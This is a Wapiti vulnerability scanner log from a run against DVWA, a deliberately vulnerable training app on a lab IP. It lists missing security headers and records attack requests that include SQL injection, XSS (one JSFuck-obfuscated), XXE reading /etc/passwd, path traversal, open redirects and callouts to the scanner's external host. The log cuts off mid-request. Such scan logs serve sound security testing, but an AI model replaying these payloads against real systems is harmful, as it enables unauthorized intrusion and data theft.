
 ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗██████╗
 ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║╚════██╗
 ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║ █████╔╝
 ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║ ╚═══██╗
 ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║██████╔╝
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═════╝  
Wapiti 3.2.10 (wapiti-scanner.github.io)
HttpOnly flag is not set on the cookie 'security' set at 'http://192.168.55.106/DVWA/'
Secure flag is not set on the cookie: 'security' set at 'http://192.168.55.106/DVWA/'
HttpOnly flag is not set on the cookie 'PHPSESSID' set at 'http://192.168.55.106/DVWA/'
Secure flag is not set on the cookie: 'PHPSESSID' set at 'http://192.168.55.106/DVWA/'
CSP is not set for URL: http://192.168.55.106/DVWA/
X-Frame-Options is not set on http://192.168.55.106/DVWA/
X-Content-Type-Options is not set on http://192.168.55.106/DVWA/
Sensitive data (cookie in the response) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/. The server did not enforce HTTPS.
Host 192.168.55.106 serves HTTP content without redirecting to HTTPS.
CSP attribute "default-src" is missing for URL: http://192.168.55.106/DVWA/vulnerabilities/csp/
CSP attribute "object-src" is missing for URL: http://192.168.55.106/DVWA/vulnerabilities/csp/
CSP attribute "base-uri" is missing for URL: http://192.168.55.106/DVWA/vulnerabilities/csp/
Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/vulnerabilities/sqli/?id=default&Submit=Submit. The server did not enforce HTTPS.
Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/vulnerabilities/csp/. The server did not enforce HTTPS.
Sensitive data (cookie in the response) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/login.php. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=info.php%3Fid%3D2. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.55.106/DVWA/setup.php. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
[*] Saving scan state, please wait...
This scan has been saved in the file /home/michal/.wapiti/scans/192.168.55.106_folder_65c7faf0.db
[*] Wapiti found 72 URLs and forms during the scan

[*] Launching module spring4shell

[*] Launching module redirect
---
Open Redirect in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php via injection in the query string
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https%3A%2F%2Fopenbugbounty.org%2F HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
---
---
Open Redirect in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php via injection in the query string
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/low.php?redirect=%2F%2Fopenbugbounty.org%2F HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
---

[*] Launching module sql
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/brute/
Evil request:
    GET /DVWA/vulnerabilities/brute/?username=alice%C2%BF%27%22%28&password=Letm3in_&Login=Login HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
---
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/info.php
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/info.php?id=2%C2%BF%27%22%28 HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
---
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/sqli/
Evil request:
    GET /DVWA/vulnerabilities/sqli/?id=default%C2%BF%27%22%28&Submit=Submit HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
---
---
---
SQL Injection in http://192.168.55.106/DVWA/vulnerabilities/cryptography/index.php via injection in the parameter direction
Evil request:
    POST /DVWA/vulnerabilities/cryptography/index.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/cryptography/
    cookie: security=low; PHPSESSID=te3sc1e2brv0vtejl6evisgjoq
    content-length: 60
    Content-Type: application/x-www-form-urlencoded

    direction=encode%20AND%2064%3D64%20AND%2069%3D69&message=Hi%20there%21
---
---
SQL Injection in http://192.168.55.106/DVWA/vulnerabilities/brute/ via injection in the parameter username
Evil request:
    GET /DVWA/vulnerabilities/brute/?username=alice%22%20AND%2050%3D50%20AND%20%2289%22%3D%2289&password=Letm3in_&Login=Login HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=te3sc1e2brv0vtejl6evisgjoq
---
---
SQL Injection in http://192.168.55.106/DVWA/vulnerabilities/javascript/ via injection in the parameter token
Evil request:
    POST /DVWA/vulnerabilities/javascript/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/javascript/
    cookie: security=low; PHPSESSID=te3sc1e2brv0vtejl6evisgjoq
    content-length: 77
    Content-Type: application/x-www-form-urlencoded

    token=default%27%20AND%2089%3D89%20AND%20%2767%27%3D%2767&phrase=ChangeMe&send=Submit
---

[*] Launching module csrf
---
Lack of anti CSRF token
    POST /DVWA/login.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/login.php
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 88
    Content-Type: application/x-www-form-urlencoded

    username=alice&password=Letm3in_&Login=Login&user_token=fd3fdf2da4c02461562f322fdf4e76b7
---
---
Lack of anti CSRF token
    POST /DVWA/security.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/security.php
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 77
    Content-Type: application/x-www-form-urlencoded

    seclev_submit=Submit&user_token=277821905c3343d7e59b64b857d43e85&security=low
---
---
Lack of anti CSRF token
    POST /DVWA/setup.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/setup.php
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 79
    Content-Type: application/x-www-form-urlencoded

    create_db=Create%20%2F%20Reset%20Database&user_token=629501a8c3229f8438c64ddd4876a4aa
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/captcha/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/captcha/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 65
    Content-Type: application/x-www-form-urlencoded

    step=1&password_new=Letm3in_&password_conf=Letm3in_&Change=Change
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/cryptography/index.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/cryptography/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 36
    Content-Type: application/x-www-form-urlencoded

    direction=encode&message=Hi%20there%21
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/cryptography/index.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/cryptography/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 17
    Content-Type: application/x-www-form-urlencoded

    password=Letm3in_
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/csp/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/csp/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 15
    Content-Type: application/x-www-form-urlencoded

    include=default
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/exec/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/exec/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 24
    Content-Type: application/x-www-form-urlencoded

    ip=default&Submit=Submit
---
---
CSRF token 'token' might be easy to predict
    POST /DVWA/vulnerabilities/javascript/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/javascript/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 41
    Content-Type: application/x-www-form-urlencoded

    token=default&phrase=ChangeMe&send=Submit
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/upload/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    referer: http://192.168.55.106/DVWA/vulnerabilities/upload/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 371
    content-type: multipart/form-data; boundary=e1a5e322e309807cfc03a25321099aab
    Content-Type: multipart/form-data; boundary=------------------------boundarystring

    ------------------------boundarystring
    Content-Disposition: form-data; name="MAX_FILE_SIZE"

    100000
    ------------------------boundarystring
    Content-Disposition: form-data; name="Upload"

    Upload
    ------------------------boundarystring
    Content-Disposition: form-data; name="uploaded"; filename="pix.gif"

    GIF89a
    ------------------------boundarystring--
---
---
Lack of anti CSRF token
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=low; PHPSESSID=cb0rgopsbvs4nqbch0kliq0tgm
    content-length: 86
    Content-Type: application/x-www-form-urlencoded

    txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
---

[*] Launching module backup

[*] Launching module xss
---
Reflected Cross Site Scripting in http://192.168.55.106/DVWA/vulnerabilities/xss_r/ via injection in the parameter name
Evil request:
    GET /DVWA/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%22wo1mfhixx0%22%29%3C%2FsCrIpT%3E HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=ro76v8imesi4rf7d6l94b9m739
---
---
Reflected Cross Site Scripting in http://192.168.55.106/DVWA/vulnerabilities/csp/ via injection in the parameter include
Warning: Content-Security-Policy is present!
Evil request:
    POST /DVWA/vulnerabilities/csp/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/csp/
    cookie: security=impossible; PHPSESSID=cs3gmqoot4ufqst3rlqpav4jst
    content-length: 62
    Content-Type: application/x-www-form-urlencoded

    include=%3CScRiPt%3Ealert%28%27wysa78mt2b%27%29%3C%2FsCrIpT%3E
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/xss_s/
Evil request:
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=impossible; PHPSESSID=cs3gmqoot4ufqst3rlqpav4jst
    content-length: 208
    Content-Type: application/x-www-form-urlencoded

    txtName=%3Ca%0Aautofocus%0Aonfocus%3D%27%28function%28%29%7Breturn%20window%7D%29%28%29%5B%22alert%22%5D%28%22wjzqbhivgq%22%29%27%0Ahref%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/xss_s/
Evil request:
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=impossible; PHPSESSID=cs3gmqoot4ufqst3rlqpav4jst
    content-length: 3783
    Content-Type: application/x-www-form-urlencoded

    txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=%3Cscript%3E%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29%3C%2Fscript%3E
---

[*] Launching module htaccess

[*] Launching module xxe
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/info.php
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/info.php?id=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=u2rtn8ugf9cg5hrg93dbgd3oqf
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/xss_s/
Evil request:
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=low; PHPSESSID=dvsv89598ojokonc90ipau1sg8
    content-length: 283
    Content-Type: application/x-www-form-urlencoded

    txtName=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
---
[*] Asking endpoint URL https://wapiti3.ovh/get_xxe.php?session_id=6c39jc for results, please wait...

[*] Launching module file
Invalid URL: http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices potentially vulnerable to open redirect
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/info.php
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/info.php?id=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=impossible; PHPSESSID=fdcdh8udcmu244uflibfsd872f
---
Invalid URL: http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA potentially vulnerable to open redirect
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/sqli/
Evil request:
    GET /DVWA/vulnerabilities/sqli/?id=%2Fetc%2Fpasswd&Submit=Submit HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=fdcdh8udcmu244uflibfsd872f
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/exec/
Evil request:
    POST /DVWA/vulnerabilities/exec/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
